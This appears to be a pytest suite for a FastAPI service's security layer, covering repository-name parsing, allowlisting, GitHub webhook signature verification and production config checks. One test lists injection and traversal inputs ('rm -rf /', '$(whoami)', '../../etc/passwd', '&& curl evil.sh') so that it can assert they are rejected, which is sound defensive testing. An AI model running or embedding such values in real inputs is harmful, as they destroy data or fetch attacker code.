"""Authentication, repository allowlisting and webhook signature verification."""

from __future__ import annotations

import hashlib
import hmac

import pytest
from fastapi import HTTPException

from app.config import Settings
from app.core.security import parse_repo, require_repo_allowed, verify_github_signature


class TestParseRepo:
    def test_splits_owner_and_name(self):
        assert parse_repo("octocat/hello-world") == ("octocat", "hello-world")

    def test_surrounding_whitespace_is_tolerated(self):
        assert parse_repo("  octocat/hello-world  ") == ("octocat", "hello-world")

    @pytest.mark.parametrize(
        "value",
        [
            "no-slash",
            "too/many/parts",
            "",
            "/leading",
            "trailing/",
        ],
    )
    def test_malformed_values_are_rejected(self, value):
        with pytest.raises(HTTPException) as exc:
            parse_repo(value)
        assert exc.value.status_code == 422

    @pytest.mark.parametrize(
        "value",
        [
            "owner/repo; rm -rf /",
            "owner/$(whoami)",
            "owner/repo`id`",
            "../../etc/passwd",
            "owner/repo && curl evil.sh",
            "owner/re po",
        ],
    )
    def test_shell_and_traversal_metacharacters_are_rejected(self, value):
        # These strings reach shell commands and URLs further down the stack.
        with pytest.raises(HTTPException) as exc:
            parse_repo(value)
        assert exc.value.status_code == 422


class TestRepoAllowlist:
    def test_wildcard_permits_everything(self, monkeypatch):
        monkeypatch.setattr("app.core.security.settings", Settings(REPO_ALLOWLIST="*"))
        require_repo_allowed("anyone", "anything")

    def test_listed_repository_is_permitted(self, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings",
            Settings(REPO_ALLOWLIST="octocat/hello-world,acme/api"),
        )
        require_repo_allowed("octocat", "hello-world")
        require_repo_allowed("ACME", "API")  # matching is case-insensitive

    def test_unlisted_repository_is_refused(self, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings", Settings(REPO_ALLOWLIST="octocat/hello-world")
        )
        with pytest.raises(HTTPException) as exc:
            require_repo_allowed("attacker", "private-repo")
        assert exc.value.status_code == 403


class TestWebhookSignature:
    @staticmethod
    def _sign(payload: bytes, secret: str) -> str:
        return "sha256=" + hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

    def test_valid_signature_is_accepted(self, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings", Settings(GITHUB_WEBHOOK_SECRET="topsecret")
        )
        payload = b'{"action":"opened"}'
        assert verify_github_signature(payload, self._sign(payload, "topsecret"))

    def test_signature_for_different_content_is_rejected(self, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings", Settings(GITHUB_WEBHOOK_SECRET="topsecret")
        )
        signature = self._sign(b'{"action":"opened"}', "topsecret")
        assert not verify_github_signature(b'{"action":"deleted"}', signature)

    def test_wrong_secret_is_rejected(self, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings", Settings(GITHUB_WEBHOOK_SECRET="topsecret")
        )
        payload = b"{}"
        assert not verify_github_signature(payload, self._sign(payload, "guessed"))

    @pytest.mark.parametrize("header", [None, "", "sha1=abc", "deadbeef"])
    def test_missing_or_malformed_headers_are_rejected(self, header, monkeypatch):
        monkeypatch.setattr(
            "app.core.security.settings", Settings(GITHUB_WEBHOOK_SECRET="topsecret")
        )
        assert not verify_github_signature(b"{}", header)

    def test_unset_secret_fails_closed(self, monkeypatch):
        # An empty secret must never mean "accept every delivery".
        monkeypatch.setattr("app.core.security.settings", Settings(GITHUB_WEBHOOK_SECRET=""))
        payload = b"{}"
        assert not verify_github_signature(payload, self._sign(payload, ""))


class TestProductionConfiguration:
    def test_production_requires_api_keys(self):
        with pytest.raises(ValueError, match="API_KEYS"):
            Settings(
                ENVIRONMENT="production",
                API_KEYS="",
                REPO_ALLOWLIST="acme/api",
                GROQ_API_KEY="x",
                E2B_API_KEY="y",
            )

    def test_production_rejects_a_wildcard_allowlist(self):
        with pytest.raises(ValueError, match="REPO_ALLOWLIST"):
            Settings(
                ENVIRONMENT="production",
                API_KEYS="key",
                REPO_ALLOWLIST="*",
                GROQ_API_KEY="x",
                E2B_API_KEY="y",
            )

    def test_a_complete_production_config_is_accepted(self):
        settings = Settings(
            ENVIRONMENT="production",
            API_KEYS="key-one,key-two",
            REPO_ALLOWLIST="acme/api",
            CORS_ORIGINS="https://swarm.acme.dev",
            GROQ_API_KEY="x",
            E2B_API_KEY="y",
        )
        assert settings.auth_required
        assert settings.repo_allowed("acme", "api")
        assert not settings.repo_allowed("acme", "other")

    def test_a_sync_database_url_is_upgraded_to_the_async_driver(self):
        settings = Settings(DATABASE_URL="postgresql://u:p@host/db")
        assert settings.DATABASE_URL.startswith("postgresql+asyncpg://")
